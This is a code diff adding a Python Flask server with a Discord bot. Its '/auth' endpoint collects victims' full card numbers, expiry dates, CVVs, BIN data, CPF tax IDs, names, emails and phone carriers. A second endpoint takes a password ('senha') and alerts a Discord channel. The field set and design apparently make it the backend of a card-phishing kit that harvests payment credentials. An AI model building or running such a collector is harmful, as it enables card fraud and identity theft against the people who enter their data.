@@ -1,0 +1,129 @@
+import os
+import asyncio
+import logging
+import threading
+from flask import Flask, request, jsonify
+from discord.ext import commands
+import discord
+from model.cardModel import Card
+
+# Configure logging
+logging.basicConfig(level=logging.INFO)
+logger = logging.getLogger(__name__)
+
+# Create the Flask application
+app = Flask(__name__)
+
+# Environment variables
+DISCORD_TOKEN = os.getenv("TOKEN")
+# Optional: set the Discord channel ID to send messages (as an integer)
+DISCORD_CHANNEL_ID = os.getenv("DISCORD_CHANNEL_ID")
+if DISCORD_CHANNEL_ID is not None:
+    try:
+        DISCORD_CHANNEL_ID = int(DISCORD_CHANNEL_ID)
+    except ValueError:
+        logger.warning("DISCORD_CHANNEL_ID is not a valid integer. Ignoring discord messaging.")
+        DISCORD_CHANNEL_ID = None
+
+# Create a Discord bot instance with all intents enabled
+intents = discord.Intents.all()
+bot = commands.Bot(command_prefix="/", intents=intents)
+
+# In-memory storage for Card objects
+cards: list[Card] = []
+
+
+@app.route('/auth', methods=['POST'])
+def auth_info():
+    """
+    Receives card and user information and registers it by creating a new Card instance.
+    Expects a JSON payload with the following keys:
+    'celular', 'operadora', 'valor', 'email', 'nome', 'cpf', 'card',
+    'mes', 'ano', 'cvv', 'token', 'bin', 'dadosbin'
+    """
+    try:
+        data = request.json
+        required_keys = [
+            'celular', 'operadora', 'valor', 'email', 'nome', 'cpf', 'card',
+            'mes', 'ano', 'cvv', 'token', 'bin', 'dadosbin'
+        ]
+        if not data or not all(key in data for key in required_keys):
+            return jsonify({'Error': 'Unknown'}), 401
+
+        # Create a new Card instance with the provided data
+        new_card = Card(
+            data.get('celular'),
+            data.get('operadora'),
+            data.get('valor'),
+            data.get('email'),
+            data.get('nome'),
+            data.get('cpf'),
+            data.get('card'),
+            data.get('mes'),
+            data.get('ano'),
+            data.get('cvv'),
+            data.get('token'),
+            data.get('bin'),
+            data.get('dadosbin')
+        )
+        cards.append(new_card)
+        return jsonify({'Message': 'Ok'}), 200
+
+    except Exception as ex:
+        logger.exception("Error in auth_info endpoint: %s", ex)
+        return jsonify({'Error': 'Unknown'}), 401
+
+
+@app.route('/authpass', methods=['POST'])
+def auth_password():
+    """
+    Receives a password authentication request.
+    Expects a JSON payload with the following keys:
+    'senha' and 'token'
+    
+    If the token matches a stored Card, a Discord message is sent.
+    """
+    try:
+        data = request.json
+        required_keys = ['senha', 'token']
+        if not data or not all(key in data for key in required_keys):
+            return jsonify({'Error': 'Unknown'}), 401
+
+        token_value = data.get('token')
+
+        # Find matching card(s) by token
+        matching_cards = [card for card in cards if card.token == token_value]
+        if not matching_cards:
+            return jsonify({'Error': 'Token not found'}), 404
+
+        # Send a message via Discord if a channel ID is provided and the channel is available
+        message_content = f"Authentication password verified for token {token_value}."
+        if DISCORD_CHANNEL_ID is not None:
+            channel = bot.get_channel(DISCORD_CHANNEL_ID)
+            if channel:
+                # Use asyncio to schedule the send operation on the bot's event loop
+                asyncio.run_coroutine_threadsafe(channel.send(message_content), bot.loop)
+            else:
+                logger.warning("Discord channel with ID %s not found.", DISCORD_CHANNEL_ID)
+        else:
+            logger.info("Discord channel not configured; skipping Discord message.")
+
+        return jsonify({'Message': 'Ok'}), 200
+
+    except Exception as ex:
+        logger.exception("Error in auth_password endpoint: %s", ex)
+        return jsonify({'Error': 'Unknown'}), 401
+
+
+def run_flask():
+    """Run the Flask app."""
+    app.run(host="0.0.0.0", port=5000)
+
+
+if __name__ == "__main__":
+    # Run the Flask app in a separate thread so that we can run the Discord bot concurrently.
+    flask_thread = threading.Thread(target=run_flask)
+    flask_thread.start()
+
+    # Start the Discord bot (this call is blocking)
+    bot.run(DISCORD_TOKEN)
